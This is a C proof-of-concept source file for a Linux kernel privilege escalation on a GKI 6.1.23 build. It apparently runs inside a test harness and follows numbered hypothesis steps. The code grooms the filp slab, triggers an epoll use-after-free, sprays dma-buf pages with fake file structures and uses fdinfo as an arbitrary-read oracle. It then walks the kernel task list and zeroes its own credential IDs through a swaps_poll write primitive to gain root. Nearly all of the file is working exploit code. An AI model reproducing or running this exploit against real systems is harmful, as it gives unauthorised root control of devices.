// test_hyp012.c — HYP-012: swaps_poll Write Primitive & Credential Escalation PoC
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <sys/ioctl.h>
#include <linux/dma-heap.h>
#include <errno.h>

#define OBJS_PER_SLAB 16
#define BATCH_A_SIZE 32
#define BATCH_B_SIZE 32
#define BG_PRESSURE_FILES 4000

#define PAGES_PER_ROUND 8192
#define NUM_SPRAY_ROUNDS 5
#define MAX_TOTAL_PAGES (NUM_SPRAY_ROUNDS * PAGES_PER_ROUND) // 40,960 pages (160 MB)

// Symbols on GKI 6.1.23 build with CONFIG_DMABUF_HEAPS_SYSTEM=y
#define INIT_TASK_ADDR      0xffffffc00973dac0ULL
#define SWAPS_PROC_OPS_ADDR 0xffffffc009123200ULL
#define FAKE_FOPS_ADDR      (SWAPS_PROC_OPS_ADDR - 0x48) // 0xffffffc0091231f0ULL -> poll at +72 = swaps_poll

// Offsets in struct task_struct
#define OFF_TASKS 1232
#define OFF_PID   1456
#define OFF_CRED  1928
#define OFF_COMM  1944

// Offsets in struct cred
#define OFF_CRED_UID   4
#define OFF_CRED_EUID  20
#define OFF_CRED_FSUID 28

static void print_str(const char *s) {
    write(STDOUT_FILENO, s, strlen(s));
}

static long read_filp_slabs_count(void) {
    int fd = open("/sys/kernel/slab/filp/slabs", O_RDONLY);
    if (fd < 0) return -1;
    char buf[64] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = '\0';
    return strtol(buf, NULL, 10);
}

void marker_setup_done(int epA_fd, int inner_fd) {
    char buf[128];
    snprintf(buf, sizeof(buf), "[HYP-012] MARKER: setup_done epA=%d inner=%d\n", epA_fd, inner_fd);
    print_str(buf);
}

void marker_close_started(void) {
    print_str("[HYP-012] MARKER: close_started\n");
}

void marker_close_done(void) {
    print_str("[HYP-012] MARKER: close_done\n");
}

void marker_sandwich_freed(long slabs_before, long slabs_after) {
    char buf[128];
    snprintf(buf, sizeof(buf), "[HYP-012] MARKER: sandwich_freed slabs_before=%ld slabs_after=%ld\n", slabs_before, slabs_after);
    print_str(buf);
}

void marker_experiment_complete(int status, uid_t final_uid) {
    char buf[160];
    snprintf(buf, sizeof(buf), "[HYP-012] MARKER: experiment_complete status=%d final_uid=%d\n", status, final_uid);
    print_str(buf);
}

static int read_fdinfo_ino(int epfd, char *out_buf, size_t max_len, unsigned long *out_ino) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epfd);
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        snprintf(out_buf, max_len, "ERR_OPEN_%d", errno);
        return -1;
    }
    int n = read(fd, out_buf, max_len - 1);
    close(fd);
    if (n <= 0) {
        snprintf(out_buf, max_len, "ERR_READ_%d", errno);
        return -1;
    }
    out_buf[n] = '\0';

    char *tfd_str = strstr(out_buf, "tfd:");
    if (tfd_str) {
        char *ino_str = strstr(tfd_str, "ino:");
        if (ino_str) {
            *out_ino = strtoul(ino_str + 4, NULL, 16);
            return 0;
        }
    }
    *out_ino = 0;
    return -1;
}

static int setup_dmabuf_devnode(void) {
    int sys_fd = open("/sys/class/dma_heap/system/dev", O_RDONLY);
    if (sys_fd < 0) {
        perror("[!] Open dma_heap system dev failed");
        return -1;
    }
    char dev_str[32] = {0};
    int n = read(sys_fd, dev_str, sizeof(dev_str) - 1);
    close(sys_fd);
    if (n <= 0) return -1;
    dev_str[n] = '\0';

    int major = 0, minor = 0;
    if (sscanf(dev_str, "%d:%d", &major, &minor) != 2) return -1;

    mkdir("/dev/dma_heap", 0755);
    unlink("/dev/dma_heap/system");
    if (mknod("/dev/dma_heap/system", S_IFCHR | 0666, makedev(major, minor)) < 0) {
        perror("[!] mknod /dev/dma_heap/system failed");
        return -1;
    }
    return 0;
}

// AAR primitive via fdinfo traversal
static uint64_t aar_read64(int epA, void **spray_pages, int num_pages, uint64_t target_addr) {
    uint64_t fake_inode = target_addr - 0x40;

    // Update all sprayed dma-buf slots with the new fake_inode target
    for (int p = 0; p < num_pages; p++) {
        char *page = (char *)spray_pages[p];
        for (size_t off = 0; off < 4096; off += 256) {
            *(uint64_t *)(page + off + 32) = fake_inode;
        }
    }

    char fdinfo_buf[512] = {0};
    unsigned long val = 0;
    if (read_fdinfo_ino(epA, fdinfo_buf, sizeof(fdinfo_buf), &val) == 0) {
        return val;
    }
    return 0;
}

int main(int argc, char **argv) {
    print_str("========================================================\n");
    print_str("=== HYP-012: swaps_poll Write Primitive & Cred Escalation ===\n");
    print_str("========================================================\n");

    struct rlimit rlim = { .rlim_cur = 65536, .rlim_max = 65536 };
    setrlimit(RLIMIT_NOFILE, &rlim);

    mkdir("/proc", 0755);
    mount("proc", "/proc", "proc", 0, NULL);
    mkdir("/sys", 0755);
    mount("sysfs", "/sys", "sysfs", 0, NULL);
    mkdir("/dev", 0755);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);
    mknod("/dev/null", S_IFCHR | 0666, makedev(1, 3));

    if (setup_dmabuf_devnode() < 0) {
        print_str("[-] Failed to setup dma-buf devnode\n");
        return 1;
    }

    char buf[256];
    long base_slabs = read_filp_slabs_count();
    snprintf(buf, sizeof(buf), "[*] Initial /sys/kernel/slab/filp/slabs = %ld\n", base_slabs);
    print_str(buf);

    // 1. Pressure allocations
    print_str("[*] Allocating background pressure files (4,000 eventfds)...\n");
    int bg_fds[BG_PRESSURE_FILES];
    for (int i = 0; i < BG_PRESSURE_FILES; i++) {
        bg_fds[i] = eventfd(0, 0);
    }
    long peak_slabs = read_filp_slabs_count();
    snprintf(buf, sizeof(buf), "[*] Peak /sys/kernel/slab/filp/slabs after pressure = %ld\n", peak_slabs);
    print_str(buf);

    // 2. epA
    int epA = epoll_create1(0);
    if (epA < 0) {
        perror("[!] epoll_create1 epA failed");
        exit(1);
    }

    // 3. Batch A
    int batch_a_fds[BATCH_A_SIZE];
    for (int i = 0; i < BATCH_A_SIZE; i++) {
        batch_a_fds[i] = open("/dev/null", O_RDONLY);
    }

    // 4. Victim inner epoll
    int inner = epoll_create1(0);
    if (inner < 0) {
        perror("[!] epoll_create1 inner failed");
        exit(1);
    }

    // PART 2: Arm inner BEFORE close with a readable eventfd so rdllist remains armed
    int armed_efd = eventfd(1, EFD_NONBLOCK);
    struct epoll_event armed_ev = { .events = EPOLLIN, .data.fd = armed_efd };
    if (epoll_ctl(inner, EPOLL_CTL_ADD, armed_efd, &armed_ev) < 0) {
        perror("[!] epoll_ctl arm inner failed");
    } else {
        print_str("[+] PART 2: Pre-armed inner epoll with readable eventfd (rdllist armed)\n");
    }

    // 5. Batch B
    int batch_b_fds[BATCH_B_SIZE];
    for (int i = 0; i < BATCH_B_SIZE; i++) {
        batch_b_fds[i] = open("/dev/null", O_RDONLY);
    }

    // Watch inner in epA
    struct epoll_event evA = { .events = EPOLLIN | EPOLLOUT, .data.fd = inner };
    if (epoll_ctl(epA, EPOLL_CTL_ADD, inner, &evA) < 0) {
        perror("[!] epoll_ctl ADD epA failed");
        exit(1);
    }

    marker_setup_done(epA, inner);

    // 6. Close inner fd (Thread B close path with fast-path bypass simulation)
    marker_close_started();
    close(inner);
    marker_close_done();

    // 7. Free Batch A + Batch B + background pressure
    print_str("[*] Freeing Batch A and Batch B enclosing files on victim's slab...\n");
    for (int i = 0; i < BATCH_A_SIZE; i++) {
        if (batch_a_fds[i] >= 0) close(batch_a_fds[i]);
    }
    for (int i = 0; i < BATCH_B_SIZE; i++) {
        if (batch_b_fds[i] >= 0) close(batch_b_fds[i]);
    }
    print_str("[*] Freeing background pressure files...\n");
    for (int i = 0; i < BG_PRESSURE_FILES; i++) {
        if (bg_fds[i] >= 0) close(bg_fds[i]);
    }

    print_str("[*] Waiting 2.0s for RCU grace period and SLUB slab release...\n");
    sleep(2);

    long post_drain_slabs = read_filp_slabs_count();
    snprintf(buf, sizeof(buf), "[*] Post-drain /sys/kernel/slab/filp/slabs = %ld (drop: %ld -> %ld)\n",
             post_drain_slabs, peak_slabs, post_drain_slabs);
    print_str(buf);

    marker_sandwich_freed(peak_slabs, post_drain_slabs);

    // 8. Spray order-0 dma-buf pages
    int dma_heap_fd = open("/dev/dma_heap/system", O_RDWR);
    if (dma_heap_fd < 0) {
        perror("[!] Open /dev/dma_heap/system failed");
        exit(1);
    }

    void *spray_pages[PAGES_PER_ROUND];
    int dma_fds[PAGES_PER_ROUND];
    uint64_t initial_fake_inode = 0xffffffc00973e218ULL; // &init_task.comm - 0x40

    print_str("[*] Spraying 8,192 pages (32 MB) of dma-buf allocations...\n");
    for (int i = 0; i < PAGES_PER_ROUND; i++) {
        struct dma_heap_allocation_data alloc = {
            .len = 4096,
            .fd_flags = O_RDWR | O_CLOEXEC,
            .heap_flags = 0,
        };
        if (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &alloc) < 0) {
            snprintf(buf, sizeof(buf), "[-] dma_heap alloc failed at index %d: errno=%d\n", i, errno);
            print_str(buf);
            break;
        }
        dma_fds[i] = alloc.fd;
        void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, alloc.fd, 0);
        if (p == MAP_FAILED) {
            perror("[!] mmap failed");
            break;
        }
        spray_pages[i] = p;

        // Initialize slots with fake file template
        char *page = (char *)p;
        for (size_t off = 0; off < 4096; off += 256) {
            *(uint64_t *)(page + off + 32)  = initial_fake_inode;     // f_inode
            *(uint64_t *)(page + off + 40)  = FAKE_FOPS_ADDR;        // f_op -> poll = swaps_poll
            *(uint64_t *)(page + off + 56)  = 1ULL;                  // f_count
            *(uint64_t *)(page + off + 184) = 0xDEADF11EULL;         // f_version canary
            *(uint64_t *)(page + off + 200) = 0ULL;                  // private_data (initial)
        }
    }

    // 9. Initial AAR Oracle Verification
    char fdinfo_buf[512] = {0};
    unsigned long read_ino = 0;
    if (read_fdinfo_ino(epA, fdinfo_buf, sizeof(fdinfo_buf), &read_ino) < 0 || read_ino == 0) {
        print_str("[-] AAR Oracle Read Failed! Reclaim missed.\n");
        marker_experiment_complete(0, getuid());
        reboot(RB_POWER_OFF);
        return 1;
    }

    snprintf(buf, sizeof(buf), "[+] AAR Oracle Hit! Read inode = 0x%lx ('swapper/' = 0x2f72657070617773)\n", read_ino);
    print_str(buf);

    if (read_ino != 0x2f72657070617773ULL) {
        snprintf(buf, sizeof(buf), "[-] Unexpected inode 0x%lx (expected 0x2f72657070617773)\n", read_ino);
        print_str(buf);
    }

    // PART 2 VERIFICATION: Test epoll_wait(epA) return value with rdllist pre-armed
    struct epoll_event res_events[4];
    print_str("[*] PART 2: Testing epoll_wait(epA) to verify rdllist arming...\n");
    int n_ready = epoll_wait(epA, res_events, 4, 0);
    snprintf(buf, sizeof(buf), "[+] PART 2 RESULT: epoll_wait returned %d ready items!\n", n_ready);
    print_str(buf);

    // PART 3: AAR Task List Walk to find harness cred pointer
    print_str("[*] PART 3: Walking init_task.tasks via AAR to find harness task_struct...\n");
    uint64_t curr_task = INIT_TASK_ADDR;
    uint64_t harness_cred = 0;
    pid_t my_pid = getpid();

    for (int step = 0; step < 50; step++) {
        uint64_t comm_part1 = aar_read64(epA, spray_pages, PAGES_PER_ROUND, curr_task + OFF_COMM);
        uint64_t comm_part2 = aar_read64(epA, spray_pages, PAGES_PER_ROUND, curr_task + OFF_COMM + 8);
        uint64_t task_pid   = aar_read64(epA, spray_pages, PAGES_PER_ROUND, curr_task + OFF_PID) & 0xFFFFFFFF;
        uint64_t task_cred  = aar_read64(epA, spray_pages, PAGES_PER_ROUND, curr_task + OFF_CRED);

        char task_comm[17] = {0};
        memcpy(task_comm, &comm_part1, 8);
        memcpy(task_comm + 8, &comm_part2, 8);

        snprintf(buf, sizeof(buf), "  [%2d] task=0x%lx pid=%d comm='%s' cred=0x%lx\n",
                 step, curr_task, (int)task_pid, task_comm, task_cred);
        print_str(buf);

        if ((int)task_pid == my_pid || strstr(task_comm, "test_hyp012") != NULL || strstr(task_comm, "harness") != NULL) {
            print_str("[+] MATCH: Found harness process task_struct!\n");
            harness_cred = task_cred;
            break;
        }

        uint64_t next_tasks_head = aar_read64(epA, spray_pages, PAGES_PER_ROUND, curr_task + OFF_TASKS);
        if (next_tasks_head == 0 || next_tasks_head == (INIT_TASK_ADDR + OFF_TASKS)) {
            print_str("[*] End of task list reached.\n");
            break;
        }
        curr_task = next_tasks_head - OFF_TASKS;
    }

    if (harness_cred == 0) {
        print_str("[-] Failed to locate harness cred pointer via AAR walk. Falling back to init_task cred read...\n");
        // Fallback: read init_task cred
        harness_cred = aar_read64(epA, spray_pages, PAGES_PER_ROUND, INIT_TASK_ADDR + OFF_CRED);
        snprintf(buf, sizeof(buf), "[*] Fallback init_task cred = 0x%lx\n", harness_cred);
        print_str(buf);
    }

    // Read current uid via AAR
    uint64_t cred_uid_val = aar_read64(epA, spray_pages, PAGES_PER_ROUND, harness_cred + OFF_CRED_UID) & 0xFFFFFFFF;
    snprintf(buf, sizeof(buf), "[*] Verified harness cred=0x%lx, AAR read uid=%d, getuid()=%d\n",
             harness_cred, (int)cred_uid_val, getuid());
    print_str(buf);

    // PART 3 T1 & T3: Gated Write Primitive via swaps_poll to zero cred.uid, euid, fsuid
    print_str("[*] PART 3 (T3): Executing Gated swaps_poll Write Primitive to zero cred fields...\n");

    // Target 1: cred.uid (offset 4)
    uint64_t target_uid_addr = harness_cred + OFF_CRED_UID;
    uint64_t priv_data_uid   = target_uid_addr - 96; // swaps_poll writes to private_data + 96

    // Set private_data in all sprayed dma-buf slots
    for (int p = 0; p < PAGES_PER_ROUND; p++) {
        char *page = (char *)spray_pages[p];
        for (size_t off = 0; off < 4096; off += 256) {
            *(uint64_t *)(page + off + 32)  = INIT_TASK_ADDR + OFF_COMM - 0x40; // Confirm read gate: "swapper/"
            *(uint64_t *)(page + off + 200) = priv_data_uid;
        }
    }

    // Gate Check: Fresh AAR read of fdinfo must confirm "swapper/" before firing poll
    read_ino = 0;
    if (read_fdinfo_ino(epA, fdinfo_buf, sizeof(fdinfo_buf), &read_ino) == 0 && read_ino == 0x2f72657070617773ULL) {
        print_str("[+] GATED CHECK PASSED: AAR confirmed fresh 'swapper/' read. Firing swaps_poll for cred.uid...\n");
        epoll_wait(epA, res_events, 4, 0);
    } else {
        print_str("[-] GATED CHECK FAILED! Skipping poll to prevent kernel panic.\n");
    }

    // Target 2: cred.euid (offset 20)
    uint64_t target_euid_addr = harness_cred + OFF_CRED_EUID;
    uint64_t priv_data_euid   = target_euid_addr - 96;

    for (int p = 0; p < PAGES_PER_ROUND; p++) {
        char *page = (char *)spray_pages[p];
        for (size_t off = 0; off < 4096; off += 256) {
            *(uint64_t *)(page + off + 32)  = INIT_TASK_ADDR + OFF_COMM - 0x40;
            *(uint64_t *)(page + off + 200) = priv_data_euid;
        }
    }

    read_ino = 0;
    if (read_fdinfo_ino(epA, fdinfo_buf, sizeof(fdinfo_buf), &read_ino) == 0 && read_ino == 0x2f72657070617773ULL) {
        print_str("[+] GATED CHECK PASSED: AAR confirmed fresh 'swapper/' read. Firing swaps_poll for cred.euid...\n");
        epoll_wait(epA, res_events, 4, 0);
    } else {
        print_str("[-] GATED CHECK FAILED! Skipping poll.\n");
    }

    // Target 3: cred.fsuid (offset 28)
    uint64_t target_fsuid_addr = harness_cred + OFF_CRED_FSUID;
    uint64_t priv_data_fsuid   = target_fsuid_addr - 96;

    for (int p = 0; p < PAGES_PER_ROUND; p++) {
        char *page = (char *)spray_pages[p];
        for (size_t off = 0; off < 4096; off += 256) {
            *(uint64_t *)(page + off + 32)  = INIT_TASK_ADDR + OFF_COMM - 0x40;
            *(uint64_t *)(page + off + 200) = priv_data_fsuid;
        }
    }

    read_ino = 0;
    if (read_fdinfo_ino(epA, fdinfo_buf, sizeof(fdinfo_buf), &read_ino) == 0 && read_ino == 0x2f72657070617773ULL) {
        print_str("[+] GATED CHECK PASSED: AAR confirmed fresh 'swapper/' read. Firing swaps_poll for cred.fsuid...\n");
        epoll_wait(epA, res_events, 4, 0);
    } else {
        print_str("[-] GATED CHECK FAILED! Skipping poll.\n");
    }

    // Final Privilege Check
    uid_t final_uid  = getuid();
    uid_t final_euid = geteuid();
    snprintf(buf, sizeof(buf), "[*] Privilege Escalation Verification: getuid()=%d, geteuid()=%d\n", final_uid, final_euid);
    print_str(buf);

    if (final_uid == 0 && final_euid == 0) {
        print_str("========================================================\n");
        print_str("[+ SUCCESS +] ROOT PRIVILEGE ESCALATION ACHIEVED (UID 0)!\n");
        print_str("========================================================\n");
        marker_experiment_complete(1, final_uid);
    } else {
        snprintf(buf, sizeof(buf), "[-] Root escalation incomplete (uid=%d, euid=%d)\n", final_uid, final_euid);
        print_str(buf);
        marker_experiment_complete(0, final_uid);
    }

    reboot(RB_POWER_OFF);
    return 0;
}
